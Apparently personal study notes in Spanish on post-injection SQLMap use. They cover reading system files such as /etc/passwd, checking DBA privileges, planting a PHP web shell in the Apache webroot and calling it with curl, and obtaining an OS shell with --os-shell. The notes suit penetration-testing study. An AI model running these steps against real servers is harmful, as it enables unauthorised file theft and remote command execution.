
SQLMap tambien puede escribir y leer archivos del sistema local fuera del DBMS

## Lectura/Escritura de archivos

Para leer debemos tener privs: LOAD DATA o INSERT

Ejemplo de comando:

```
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

No necesariamente tenemos que tener privs de DBA para leer aunque si los tenemos es mas probable que podamos


## Comprobando privilegios DBA

```
sqlmap -u URL --is-dba
```

## Leyendo archivos locales

```
sqlmap -u URL --file-read="/RUTA/ARCHIVO"
```

## Escribiendo archivos locales

En los DBMS modernos es mas dificil

Debe estar deshabilitado el priv --secure-file-priv para permitir la escritura mediante INTO OUFILE

Para escribir usaremos --file-write y --file-dest

1. Escribimos un webshell

```
echo "WEBSHELL PHP" > web.php
```
![[Pasted image 20260714152317.png]]

2. Ahora intentamos escribir en la webroot "/var/www/html/" de Apache

```
sqlmap -u URL --file-write "web.php" --file-dest "/var/www/html/web.php"
```
![[Pasted image 20260714152500.png]]![[Pasted image 20260714152509.png]]

3. Accedemos al sitio web donde se aloja el web.php

```
curl http://www.example.com/web.php?cmd=ls+-la
```
![[Pasted image 20260714152608.png]]


## Ejecucion de comandos SO

Como vemos que podemos escribir, podemos probar la capacidad de SQLMap para ejecutar comandos

SQLMap usa varias tecnicas como escribir funciones SQL que ejecutan comandos y recuperar su salida o usar consultas SQL que ejecutan comandos directamente con xp_cmdshell

Usaremos la flat `--os-shell`

- Nos preguntara por el lenguaje que acepta la BBDD, el webroot... con `--batch` se autocompleta

```
sqlmap -u URL --os-shell
```
![[Pasted image 20260714152919.png]]

Vemos que uso UNION y no nos dio salida. Podemos tratar de especificar la tecnica

```
sqlmap -u URL --os-shell --technique=E
```
